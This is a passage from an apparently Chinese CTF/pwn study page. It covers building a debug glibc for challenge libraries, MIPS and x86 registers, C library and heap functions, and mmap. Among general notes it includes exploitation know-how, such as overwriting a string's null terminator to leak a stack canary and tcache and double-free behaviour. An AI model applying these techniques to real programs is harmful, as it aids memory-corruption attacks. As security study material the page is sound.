<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>wget http://ftp.gnu.org/gnu/glibc/glibc-2.31.tar.gz <span class=c1># 下载压缩包，其中包括glibc源码，可用于后续gdb dir</span>
</span></span><span class=line><span class=cl>tar -zxvf glibc-2.31.tar.gz <span class=c1># 解压</span>
</span></span><span class=line><span class=cl><span class=nb>cd</span> glibc-2.31
</span></span><span class=line><span class=cl>mkdir build <span class=o>&amp;&amp;</span> <span class=nb>cd</span> build
</span></span><span class=line><span class=cl><span class=nv>CFLAGS</span><span class=o>=</span><span class=s2>&#34;-g -g3 -ggdb -gdwarf-4 -Og -Wno-error&#34;</span> <span class=se>\ </span><span class=c1># C编译器标志</span>
</span></span><span class=line><span class=cl><span class=nv>CXXFLAGS</span><span class=o>=</span><span class=s2>&#34;-g -g3 -ggdb -gdwarf-4 -Og -Wno-error&#34;</span> <span class=c1># C++编译器标志</span>
</span></span><span class=line><span class=cl>sudo ../configure<span class=o>=</span>/home/xx/glibc-2.31/amd64 --disable-werror --enable-debug<span class=o>=</span>yes
</span></span><span class=line><span class=cl>sudo make
</span></span><span class=line><span class=cl>sudo make install</span></span></code></pre></div></div><ul><li>最终<code>/home/xx/glibc-2.31/amd64</code>目录下有<code>bin etc include lib libexec sbin share var</code>，<code>lib</code>中包含所需的<code>libc-2.31.so</code>和<code>ld-2.31.so</code>文件，patchelf 后可调试 libc 中函数 c 代码</li><li>对应出题提供的 libc 和 ld，找到编译后 lib 下的 libc 和 ld 进行 patchelf，并且<code>gdb dir 源代码目录(source/malloc)</code>来调试 libc 函数信息</li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># gcc -Wl,-rpath指定链接的libc库，-Wl,-dynamic-linker指定动态链接器</span>
</span></span><span class=line><span class=cl>gcc -g test.c -Wl,-rpath<span class=o>=</span>/home/x/glibc/amd64/lib -Wl,-dynamic-linker<span class=o>=</span>/home/x/glibc/amd64/lib/ld-linux.so.2</span></span></code></pre></div></div><p>32 位</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>wget http://ftp.gnu.org/gnu/glibc/glibc-2.31.tar.gz <span class=c1># 下载压缩包</span>
</span></span><span class=line><span class=cl>tar -zxvf glibc-2.31.tar.gz <span class=c1># 解压</span>
</span></span><span class=line><span class=cl><span class=nb>cd</span> glibc-2.31
</span></span><span class=line><span class=cl>mkdir build <span class=o>&amp;&amp;</span> <span class=nb>cd</span> build
</span></span><span class=line><span class=cl><span class=nv>CFLAGS</span><span class=o>=</span><span class=s2>&#34;-g -g3 -ggdb -gdwarf-4 -Og -Wno-error -m32&#34;</span>  <span class=c1># C编译器标志</span>
</span></span><span class=line><span class=cl><span class=nv>CXXFLAGS</span><span class=o>=</span><span class=s2>&#34;-g -g3 -ggdb -gdwarf-4 -Og -Wno-error -m32&#34;</span>  <span class=c1># C++编译器标志</span>
</span></span><span class=line><span class=cl>sudo ../configure --prefix<span class=o>=</span>/home/xx/glibc-2.31/i686 --host<span class=o>=</span>i686-pc-linux-gnu --disable-werror --enable-debug<span class=o>=</span>yes
</span></span><span class=line><span class=cl>sudo make
</span></span><span class=line><span class=cl>sudo make install</span></span></code></pre></div></div><h3 id=mips>Mips</h3><p><strong>32 个通用寄存器</strong></p><table><thead><tr><th><strong>编号</strong></th><th><strong>名称</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><code>$0 or $zero</code></td><td>0 号寄存器，始终为 0</td><td></td></tr><tr><td><code>$1 or $at</code></td><td>保留寄存器</td><td></td></tr><tr><td><code>$2-$3</code></td><td><code>$v0-$v1</code></td><td>values，保存表达式或函数返回结果</td></tr><tr><td><code>$4-$7</code></td><td><code>$a0-$a3</code></td><td>argument，作为函数前 4 个参数</td></tr><tr><td><code>$8-$15</code></td><td><code>$t0-$t7</code></td><td>temporaries，供汇编程序使用的临时寄存器</td></tr><tr><td><code>$16-$23</code></td><td><code>$s0-$s7</code></td><td>Saved values，子函数使用时需先保存原寄存器的值</td></tr><tr><td><code>$24-$25</code></td><td><code>$t8-$t9</code></td><td>temporaries，临时寄存器，补充<code>$t0-$t7</code></td></tr><tr><td><code>$26-$27</code></td><td><code>$k0-$k1</code></td><td>保留，中断处理函数使用</td></tr><tr><td><code>$28 or $gp</code></td><td>Global pointer，全局指针</td><td></td></tr><tr><td><code>$29 or $sp</code></td><td>Stack pointer，堆栈指针，指向堆栈的栈顶</td><td></td></tr><tr><td><code>$30 or $fp</code></td><td>Frame pointer，保存栈指针</td><td></td></tr><tr><td><code>$31 or $ra</code></td><td>Return address，返回地址</td><td></td></tr></tbody></table><p><strong>特殊寄存器</strong></p><ul><li>PC（程序计数器）</li><li>HI（乘除结果高位寄存器）</li><li>LO（乘除结果低位寄存器）</li></ul><h3 id=assembly>Assembly</h3><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-Assembly"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><pre tabindex=0><code class=language-Assembly data-lang=Assembly>lea ; 加载内存地址
mov ; 传递内存地址中的值
test eax, eax ; 等价于eax &amp; eax, 不影响eax值, 改变标志寄存器值, 判断eax是否为0, 为0则设置ZF
push xx ; esp先减小, 将xx的值压入栈中, 即放入esp所指地址
call func ; 将call的下一条命令压入栈, jmp到func地址去, call完ret时, call的下一条命令会出栈, 存入eip中执行, 而call的函数的参数仍留在了栈中

hello: db &#34;hello&#34;, 0xa  ;将字符串 &#34;hello&#34; 和一个换行符存储在内存中
len: equ $-hello        ;equ类似于定义/等于, $ 表示当前地址的符号，而 -hello 表示 len 到 hello 的距离</code></pre></div><p><strong>AVX</strong>指令集中的 SIMD(Single Instruction Mutiple Data)指令，处理 256 位</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-assembly"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><pre tabindex=0><code class=language-assembly data-lang=assembly>vmovdqa ymmword ptr [rcx + 60h], ymm1
# 将ymm1寄存器中的256位数据存储到内存地址[rcx + 0x60]处  ymmword: 32字节</code></pre></div><p><strong>寄存器</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-Bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-Bash data-lang=Bash><span class=line><span class=cl>rax:   <span class=m>64</span>
</span></span><span class=line><span class=cl>eax:   <span class=m>32</span>
</span></span><span class=line><span class=cl>ax:    <span class=m>16</span>
</span></span><span class=line><span class=cl>al,ah: <span class=m>8</span></span></span></code></pre></div></div><h3 id=c>C</h3><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-C"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=cp>#pragma once </span><span class=c1>// 防止头文件被多次包含, 告诉编译器只包含该头文件一次
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=nf>printf</span><span class=p>(</span><span class=s>&#34;123456</span><span class=se>\r</span><span class=s>321</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span> <span class=c1>// \r用于回到当前行的开头, \r后边的数字替代这一行最开始的相等数目的数字
</span></span></span><span class=line><span class=cl><span class=c1>// output: 321456, 隐藏了123
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=nf>putchar</span><span class=p>(</span><span class=mi>10</span><span class=p>);</span> <span class=c1>// 换行
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nf>printf</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\x1B</span><span class=s>[2J</span><span class=se>\x1B</span><span class=s>[H&#34;</span><span class=p>);</span> <span class=c1>// x1B:ESC, [2J:清屏, [H:光标移至左上角
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span> <span class=n>v1</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span> <span class=p>)</span> <span class=n>xxx</span><span class=p>;</span>    <span class=c1>//v1为空或无效
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>if</span> <span class=p>(</span> <span class=n>v1</span> <span class=o>==</span> <span class=mi>10</span> <span class=p>)</span> <span class=n>xxx</span><span class=p>;</span>    <span class=c1>//v1为换行符，ASCII值为10
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=o>*</span><span class=n>ptr</span><span class=p>[</span><span class=mi>2</span><span class=p>];</span> <span class=c1>// 声明大小为2的指针数组
</span></span></span></code></pre></div></div><p><strong>注</strong>：</p><ol><li>C 语言中字符串以"\x00"结尾，篡改字符串中的"\x00"可以导致泄露后续数据如 canary 值</li><li>read 函数调用的第一个参数：0 标准输入，1 标准输出，2 标准错误</li></ol><p><strong>main</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-C"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=kt>char</span> <span class=o>*</span><span class=n>argv</span><span class=p>[])</span> <span class=o>=</span> <span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=kt>char</span> <span class=o>**</span><span class=n>argv</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=kt>char</span> <span class=o>**</span><span class=n>argv</span><span class=p>,</span> <span class=kt>char</span> <span class=o>**</span><span class=n>envp</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1>//argc：参数计数
</span></span></span><span class=line><span class=cl><span class=c1>//argv[0]：文件路径名
</span></span></span><span class=line><span class=cl><span class=c1>//argv[1]:第一个字符串
</span></span></span><span class=line><span class=cl><span class=c1>//argv[2]:第二个字符串
</span></span></span><span class=line><span class=cl><span class=c1>//argv[argc]：NULL
</span></span></span></code></pre></div></div><p><strong>内联汇编格式</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-C"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=k>asm</span> <span class=nf>volatile</span><span class=p>(</span>
</span></span><span class=line><span class=cl>    <span class=s>&#34;instruction list&#34;</span>
</span></span><span class=line><span class=cl>    <span class=o>:</span><span class=s>&#34;=r&#34;</span><span class=p>(</span><span class=n>xxx</span><span class=p>)</span>   <span class=c1>//output
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=o>:</span><span class=s>&#34;r(...)&#34;</span>    <span class=c1>//input
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=o>:</span>
</span></span><span class=line><span class=cl><span class=p>);</span></span></span></code></pre></div></div><p><strong>宏</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-C"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=nf>LODWORD</span><span class=p>(</span><span class=n>v4</span><span class=p>)</span> <span class=o>=</span> <span class=mi>0</span>    <span class=c1>//初始化低32位为0
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nf>HIDWORD</span><span class=p>(</span><span class=n>v4</span><span class=p>)</span> <span class=o>=</span> <span class=mi>0</span>    <span class=c1>//初始化高32位为0
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nf>SHIDWORD</span><span class=p>(</span><span class=n>v4</span><span class=p>)</span>       <span class=c1>//取高32位并作为有符号整数
</span></span></span></code></pre></div></div><p><strong>SIGSEGV</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-C"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;signal.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=nf>signal</span><span class=p>(</span><span class=n>SIGSEGV</span><span class=p>,</span> <span class=n>sigsegv_handler</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=c1>//使用该函数在发生segment fault时会调用自己定义的sigsegv_handler函数
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=c1>// 可查看对应整数
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nf>printf</span><span class=p>(</span><span class=s>&#34;signal: %d</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>SIGABRT</span><span class=p>);</span> <span class=c1>// 6
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nf>printf</span><span class=p>(</span><span class=s>&#34;signal: %d</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>SIGFPE</span><span class=p>);</span>	 <span class=c1>// 8
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nf>printf</span><span class=p>(</span><span class=s>&#34;signal: %d</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>SIGILL</span><span class=p>);</span>  <span class=c1>// 4
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nf>printf</span><span class=p>(</span><span class=s>&#34;signal: %d</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>SIGINT</span><span class=p>);</span>  <span class=c1>// 2
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nf>printf</span><span class=p>(</span><span class=s>&#34;signal: %d</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>SIGSEGV</span><span class=p>);</span> <span class=c1>// 11
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nf>printf</span><span class=p>(</span><span class=s>&#34;signal: %d</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>SIGTERM</span><span class=p>);</span> <span class=c1>// 15
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nf>printf</span><span class=p>(</span><span class=s>&#34;signal: %d</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>SIGALRM</span><span class=p>);</span> <span class=c1>// 14
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=nf>signal</span><span class=p>(</span><span class=mi>14</span><span class=p>,</span> <span class=n>timeout_func</span><span class=p>);</span></span></span></code></pre></div></div><p><strong>函数</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-C"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=kt>long</span> <span class=nf>strtol</span><span class=p>(</span><span class=k>const</span> <span class=kt>char</span> <span class=o>*</span><span class=n>str</span><span class=p>,</span> <span class=kt>char</span> <span class=o>**</span><span class=n>endptr</span><span class=p>,</span> <span class=kt>int</span> <span class=n>base</span><span class=p>);</span> <span class=c1>// 将str指向的字符数组转换为长整型
</span></span></span><span class=line><span class=cl><span class=c1>// endptr: 存储转换后的字符串的结束位置
</span></span></span><span class=line><span class=cl><span class=c1>// base: 转换时使用的进制
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=nf>chr</span><span class=p>(</span><span class=n>i</span><span class=p>);</span> <span class=c1>// 将Unicode码转换为字符
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=nf>atoi</span><span class=p>(</span><span class=o>&amp;</span><span class=n>buf</span><span class=p>);</span> <span class=c1>//将 buf 中的字符串转换为整数
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=nf>getchar</span><span class=p>();</span> <span class=c1>// 从标准输入读取一个字符，将其作为无符号字符强制转换为int返回
</span></span></span><span class=line><span class=cl><span class=c1>// getchar()在scanf()前，则scanf时将需要多加一个字节
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=nf>__isoc99_scanf</span><span class=p>(</span><span class=s>&#34;%[^</span><span class=se>\n</span><span class=s>]s&#34;</span><span class=p>,</span> <span class=n>v</span><span class=p>);</span> <span class=c1>// 表示输入直到回车
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=nf>scanf</span><span class=p>(</span><span class=s>&#34;%d&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>array</span><span class=p>[</span><span class=n>i</span><span class=p>]);</span> <span class=c1>// 当传入+或-时会跳过scanf不改变该数组中的值
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=nf>strcmp</span><span class=p>(</span><span class=n>v1</span><span class=p>,</span> <span class=n>v2</span><span class=p>);</span> <span class=c1>// 注意观察值可能在某处可泄露
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nf>strlen</span><span class=p>(</span><span class=n>s</span><span class=p>);</span>      <span class=c1>// 字符串长度，直到空字符，不包含\0
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=n>s</span> <span class=o>=</span> <span class=nf>strtok</span><span class=p>(</span><span class=n>a</span><span class=p>,</span> <span class=s>&#34; &#34;</span><span class=p>);</span> <span class=c1>// 将a字符串按&#34; &#34;分割返回第一个子字符串
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>execve</span><span class=p>(</span><span class=k>const</span> <span class=kt>char</span> <span class=o>*</span><span class=n>__path</span><span class=p>,</span> <span class=kt>char</span> <span class=o>*</span><span class=k>const</span> <span class=n>__argv</span><span class=p>[],</span> <span class=kt>char</span> <span class=o>*</span><span class=k>const</span> <span class=n>__envp</span><span class=p>[]);</span>
</span></span><span class=line><span class=cl><span class=c1>// glibc包装了execl(),execlp(),execle(),execv(),execvp()5个exec API, 参数区别, 最终还是execve()
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=nf>qmemcpy</span><span class=p>(</span><span class=n>dest_memory</span><span class=p>,</span> <span class=n>source_data</span><span class=p>,</span> <span class=n>size</span><span class=p>);</span> <span class=c1>// 将size大小的源数据放入目标内存中
</span></span></span></code></pre></div></div><p><strong>堆相关</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>void</span> <span class=o>*</span><span class=nf>malloc</span><span class=p>(</span><span class=kt>size_t</span> <span class=n>size</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>	malloc: memory allocation 分配一块至少为size字节的连续内存区域, 返回一个指向该内存的指针
</span></span></span><span class=line><span class=cl><span class=cm>	n=0时返回当前系统允许的堆的最小内存块
</span></span></span><span class=line><span class=cl><span class=cm>	n&lt;0时由于size_t无符号数, 申请很大内存空间, 一般会失败
</span></span></span><span class=line><span class=cl><span class=cm>*/</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=o>*</span><span class=nf>calloc</span><span class=p>(</span><span class=kt>size_t</span> <span class=n>nmemb</span><span class=p>,</span> <span class=kt>size_t</span> <span class=n>size</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>	calloc: 动态分配内存并初始化其内容为零, 分配nmemb个元素, 每个大小size字节
</span></span></span><span class=line><span class=cl><span class=cm>	清空chunk上内容，且不从tcache中拿chunk，但free默认先往tcache放
</span></span></span><span class=line><span class=cl><span class=cm>*/</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=o>*</span><span class=nf>realloc</span><span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=n>ptr</span><span class=p>,</span> <span class=kt>size_t</span> <span class=n>size</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>	realloc: 重新分配之前通过malloc/calloc/realloc分配的内存区域，可以改变内存块大小，释放和分配内存块
</span></span></span><span class=line><span class=cl><span class=cm>	ptr指向内存块，size为新内存块大小
</span></span></span><span class=line><span class=cl><span class=cm>	ptr不为空，size=0: 释放原来的堆块, 等价于free
</span></span></span><span class=line><span class=cl><span class=cm>	ptr为空，size&gt;0: 等价于malloc
</span></span></span><span class=line><span class=cl><span class=cm>	ptr不为空，size大于原来堆块大小: 若该堆块后的堆块空闲则合并堆块，否则释放原堆块，申请一个更大堆块，原堆块内容拷贝过去
</span></span></span><span class=line><span class=cl><span class=cm>	ptr不为空，size不大于原来堆块大小: 若切割后剩下堆块大于等于MINSIZE，则切割并释放，返回原堆块
</span></span></span><span class=line><span class=cl><span class=cm>*/</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>free</span><span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=n>ptr</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>	释放ptr指向的内存块，ptr为空指针，不执行任何操作；ptr已被释放，再释放导致double free
</span></span></span><span class=line><span class=cl><span class=cm>*/</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>mallopt</span><span class=p>(</span><span class=kt>int</span> <span class=n>param</span><span class=p>,</span> <span class=kt>int</span> <span class=n>value</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>	控制堆的特定参数来改变堆分配策略
</span></span></span><span class=line><span class=cl><span class=cm>	param:
</span></span></span><span class=line><span class=cl><span class=cm>		- M_MXFAST: 设置 malloc 用于小块内存分配的最大 fast bin 大小
</span></span></span><span class=line><span class=cl><span class=cm>		- M_TRIM_THRESHOLD: 设置 sbrk 释放内存回操作系统的阈值
</span></span></span><span class=line><span class=cl><span class=cm>        - M_TOP_PAD: 设置 sbrk 请求额外内存时，上面的额外内存量
</span></span></span><span class=line><span class=cl><span class=cm>        - M_MMAP_THRESHOLD: 设置使用 mmap 进行内存分配的阈值
</span></span></span><span class=line><span class=cl><span class=cm>        - M_MMAP_MAX: 设置可以使用 mmap 进行内存分配的最大数目
</span></span></span><span class=line><span class=cl><span class=cm>    value: 新值
</span></span></span><span class=line><span class=cl><span class=cm>	返回非0:成功, 0:失败
</span></span></span><span class=line><span class=cl><span class=cm>*/</span></span></span></code></pre></div></div><p><strong>mmap</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-C"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=c1>// 文件或设备的内容映射到内存地址空间 或 分配匿名共享内存
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kt>void</span> <span class=o>*</span><span class=nf>mmap</span><span class=p>(</span><span class=kt>void</span> <span class=n>addr</span><span class=p>[.</span><span class=n>length</span><span class=p>],</span> <span class=kt>size_t</span> <span class=n>length</span><span class=p>,</span> <span class=kt>int</span> <span class=n>prot</span><span class=p>,</span> <span class=kt>int</span> <span class=n>flags</span><span class=p>,</span><span class=kt>int</span> <span class=n>fd</span><span class=p>,</span> <span class=kt>off_t</span> <span class=n>offset</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=c1>// addr: 映射的起始地址, 传入NULL则OS自动选择
</span></span></span><span class=line><span class=cl><span class=c1>// length: 映射长度, 单位: 字节
</span></span></span><span class=line><span class=cl><span class=c1>// prot: 映射内存的保护模式  PROT_READ 1读 PROT_WRITE 2写 PROT_EXEC 4执行
</span></span></span><span class=line><span class=cl><span class=c1>// flags : 映射的类型, 对映射同一区域的其他进程是否可见
</span></span></span><span class=line><span class=cl><span class=c1>// fd: 文件描述符, 0,-1表示匿名映射: 通常用于分配内存
</span></span></span><span class=line><span class=cl><span class=c1>// offset: 文件偏移量, 从文件该位置开始映射
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=c1>// 使用 mmap 分配内存 需要用对应的标志的值进行异或! https://sites.uclouvain.be/SystInfo/usr/include/bits/mman.h.html
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kt>void</span> <span class=o>*</span><span class=n>mapped_memory</span> <span class=o>=</span> <span class=nf>mmap</span><span class=p>(</span><span class=nb>NULL</span><span class=p>,</span> <span class=n>file_size</span><span class=p>,</span> <span class=n>PROT_READ</span> <span class=o>|</span> <span class=n>PROT_WRITE</span><span class=p>,</span> <span class=n>MAP_PRIVATE</span> <span class=o>|</span> <span class=n>MAP_ANONYMOUS</span><span class=p>,</span> <span class=o>-</span><span class=mi>1</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=c1>// 文件映射到内存, mapped为指向该映射内存地址起点的指针, 失败则返回MAP_FAILED(-1)
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kt>void</span> <span class=o>*</span><span class=n>mapped</span> <span class=o>=</span> <span class=nf>mmap</span><span class=p>(</span><span class=nb>NULL</span><span class=p>,</span> <span class=n>sb</span><span class=p>.</span><span class=n>st_size</span><span class=p>,</span> <span class=n>PROT_READ</span><span class=p>,</span> <span class=n>MAP_PRIVATE</span><span class=p>,</span> <span class=n>fd</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span></span></span></code></pre></div></div><p><strong>动态加载库</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
